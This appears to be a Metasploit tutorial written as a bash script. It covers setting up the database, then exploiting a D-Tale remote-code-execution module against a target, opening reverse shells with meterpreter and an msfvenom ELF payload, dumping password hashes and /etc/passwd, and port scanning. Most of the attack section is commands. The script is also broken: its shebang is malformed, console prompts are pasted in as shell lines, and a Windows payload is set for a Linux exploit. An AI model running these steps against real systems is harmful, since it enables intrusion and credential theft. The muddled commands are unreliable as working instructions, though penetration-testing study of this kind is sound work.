#/bin/bash
# Comprehensive guide to setting up and using Metasploit
echo "Part 1: Setup Metasploit Locally with PostgreSQL"
echo "1. Install PostgreSQL: Install PostgreSQL and its dependencies on your Ubuntu system."
sudo apt update && sudo apt upgrade -y
sudo snap install metasploit-framework
sudo apt install postgresql
echo "2. Start PostgreSQL Service"
sudo service postgresql start
sudo service postgresql status
echo "3. Create PostgreSQL User"
sudo -u postgres createuser msf_user -P --createdb
echo "4. Create PostgreSQL Database"
sudo -u postgres createdb -O msf_user msf_database
echo "5. Initialize Metasploit Database"
sudo msfdb init
echo "6. Verify Database Connection"
msfconsole -q
msf6 > db_status
echo "Part 2: Basic Usage of Metasploit"
echo "1. Start the Metasploit Console"
msfconsole
echo "2. Search for Exploits (example: D-Tale RCE)"
msf6 > search name:D-Tale RCE type:exploit
echo "3. Select an Exploit"
msf6 > use exploit/linux/http/dtale_rce_cve_2025_0655
echo "4. Set Exploit Options"
msf6 exploit(linux/http/dtale_rce_cve_2025_0655) > show options
msf6 exploit(linux/http/dtale_rce_cve_2025_0655) > set RHOST <target_ip>
echo "5. Set Payload"
msf6 exploit(linux/http/dtale_rce_cve_2025_0655) > show payloads
msf6 exploit(linux/http/dtale_rce_cve_2025_0655) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
echo "6. Set Local Host and Port"
msf6 exploit(linux/http/dtale_rce_cve_2025_0655) > set LHOST <your_ip>
msf6 exploit(linux/http/dtale_rce_cve_2025_0655) > set LPORT 4444
echo "7. Run the Exploit:"
msf6 exploit(linux/http/dtale_rce_cve_2025_0655) > exploit
echo "8. Use notes command to document results to store detailed findings and notes during penetration testing activities"
msf6 exploit(linux/http/dtale_rce_cve_2025_0655) > notes -a -t scan -n "Port 40000 open - D-Tale service" <target_ip>
msf6 exploit(linux/http/dtale_rce_cve_2025_0655) > notes -a -t vulnerability -n "Vulnerable to D-Tale RCE" <target_ip>
msf6 exploit(linux/http/dtale_rce_cve_2025_0655) > notes -a -t exploitation -n "Successfully gained shell access" <target_ip>
echo "9. Use loot command to collect and store valuable data obtained during penetration testing sessions"
meterpreter > run post/linux/gather/hashdump
meterpreter > loot
meterpreter > loot -a "file" -n "D-Tale /etc/passwd dump" -s "D-Tale RCE" -f "/tmp/passwd_dump.txt" <target_ip>
meterpreter > loot -t session_data -n "d-tale_session" -f /tmp/session.json
meterpreter > exit
echo "Part 3: Create and Use a Simple Payload"
echo "1. Generate a Payload: Use Metasploitâ€™s msfvenom tool to create a custom payload with specific characteristics."
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<your_ip> LPORT=4444 -f elf -o payload.elf
echo "2. Payload Specifications: Specify parameters such as payload type, local host, local port, output format, and output file name. payload.elf"
msfconsole
msf6 > use exploit/multi/handler
msf6 > set PAYLOAD linux/x64/shell_reverse_tcp
msf6 > set LHOST <YOUR_IP>
msf6 > set LPORT 4444
msf6 > run
echo "3. Execute the Payload: Validate the generated payload and understand how it can be executed on Ubuntu systems."   
echo "Upload the payload.elf to the target server through the vulnerable interface"
echo "Make the payload executable:"
chmod +x payload.elf
echo "Execute the payload:"
./payload.elf
echo -e "Part 4: Exploring Auxiliary Modules"
msfconsole
msf6 > use auxiliary/scanner/portscan/tcp
msf6 > set RHOSTS 192.168.1.100
msf6 > set PORTS 1-1000
msf6 > set THREADS 20
msf6 > run
msf6 > notes -t portscan -n 'Scanned 192.168.1.100 ports 1-1000'
msf6 > loot -t csv -f portscan_results.csv -n 'Port scan results'
msf6 > exit
echo "Part 5: Documentation and Reporting"
echo -e "Generating reports..."
msfconsole
msf6 > notes -l > notes.csv
msf6 > loot -t csv -l > loot.csv
msf6 > mkdir -p reports
msf6 > report -t html -o reports/metasploit_report.html
msf6 > exit
